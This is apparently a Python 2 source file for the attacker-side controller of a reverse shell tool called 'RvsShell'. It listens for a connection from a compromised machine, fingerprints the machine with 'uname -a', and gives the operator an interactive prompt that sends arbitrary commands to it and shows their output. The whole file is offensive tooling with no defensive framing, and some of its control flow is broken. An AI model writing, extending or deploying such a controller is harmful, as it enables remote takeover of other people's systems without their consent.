
import socket,subprocess as sp ,sys,os
from colorama import  Fore,Style


def recv_data(connection):
    response = connection.recv(1024)
    total_size = long(response[:16])
    response = response[16:]
    while total_size > len(response): #start loop
        data = connection.recv(1024) #to receive the remaining data
        response += data #output exceeds 1024 
    print (Fore.BLUE + "%s" %response)
    print(Fore.RESET)

def send_data(connection,data):
    data = data.encode('utf-8')
    try:
        connection.send(data)
        recv_data(connection)
    except socket.error as e :
        print(Fore.RED + "[-] Unable to send data" + Fore.RESET)

def console(connection, ip,port):
    print (Fore.GREEN + "[Info]" + Fore.RESET ),
    print(Fore.BLUE +  " Connection Established from: %s:%s " %(ip,port))
    print( Fore.RESET)

    connection.send("uname -a")
    sysinfo = connection.recv(1024).split(" ")
    print (Fore.GREEN + "Operating System :" + Fore.RESET ),
    print(Fore.BLUE + "%s" % sysinfo[0])
    print( Fore.RESET)
    print (Fore.GREEN + "Node Name  :" + Fore.RESET ),
    print(Fore.BLUE + "%s" % sysinfo[1])
    print( Fore.RESET)
    print (Fore.GREEN + "Release   :" + Fore.RESET ),
    print(Fore.BLUE + "%s" %sysinfo[2])
    print( Fore.RESET)
    print (Fore.GREEN + "Version   :" + Fore.RESET ),
    print(Fore.BLUE + "%s %s %s %s %s" % (sysinfo[3],sysinfo[4],sysinfo[5],sysinfo[6],sysinfo[7]))
    print( Fore.RESET)
    print (Fore.GREEN + "Machine   :" + Fore.RESET ),
    print(Fore.BLUE + "%s" % sysinfo[8])
    print( Fore.RESET)

    user = sysinfo[1] +'@'+ip
    while 1 : #Run a while loop to inintiate the reverse connection 
        command = raw_input(Fore.RED + '%s >' %user ) #Command to enter on server 
        print( Fore.RESET)
        if command != "exit()" : #if command is not exit(), execute
            if command  != "" : #continue command is empty ,loop function  ******made changes here*******
                response = send_data(connection, command)
                print ("%s" %response)
        elif command == "":
            continue
        elif command == "cls":
            dp = os.system("clear")
        elif command == "exit()":
            connection.send("exit")
            print (Fore.BLUE + "[+] " + Fore.RESET),
            print (Fore.GREEN + "Shell Going Down" + Fore.RESET)
            connection.close()
        else:
            print (Fore.RED + "[!] UnKown command" + Fore.RESET)
def banner():
    banner = '''
373737373737373737373737373737373737373737373737373737373737373737373737373737373737373737373737
7                                                                                              3
3           ##                        #######  #             #   #                             7
7           # #                       #        #             #   #                             3
3           #  #                      #        #             #   #       |                     7
7           #  #                      #        #             #   #       |Author:Fumbani       3
3           ## #  #       #  ####     #######  #####  #####  #   #       |                     7
7           # #    #     #   #              #  #   #  #   #  #   #       |Version:1.0 RvsShell 3
3           #  #    #   #    ####           #  #   #  ####   #   #       |                     7
7           #   #    # #        #           #  #   #  #      #   #                             3
3           #    #    #      ####     #######  #   #  #####  #   #                             7
7                                                                                              3
3                                                                                              7
737373737373737373737373737373737373737373737373737373737373737373737373737373737373737373737373
'''
    return banner
def main_control():
    try:
        host = sys.argv[1] #attacker's host address , usually ''
        port = int (sys.argv[2]) #attacker's host port
    except Exception as e :
        print (Fore.RED + "[-] Socket Information Not Provided" + Fore.RESET)
        sys.exit(1)
    print (Fore.GREEN + "[*]" + Fore.RESET ),
    print (Fore.BLUE + " Framework Started Successfully " + Fore.RESET)
    print (Fore.CYAN)
    #print(banner()) uncomment this line to print the banner
    print (Fore.RESET)
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM) #setup socket

    s.bind((host,port)) #Bind the socket
    s.listen(5) #Max coonections: 5

    if host == "":
        host = "localhost"

    print(Fore.GREEN + "[*]" + Fore.RESET),
    print(Fore.BLUE +  "Listening on %s:%d ... " %(host,port))
    print(Fore.RESET)
    try:
        conn,addr = s.accept()

        sysi = conn.recv(2048).split(",")
 
    except KeyboardInterrupt:
        print(Fore.RED + "[-] User Requested An Interrupt" + Fore.RESET)
        sys.exit(0)

    console(conn,str(addr[0]),str(addr[1]))

if __name__ == '__main__':
    main_control()
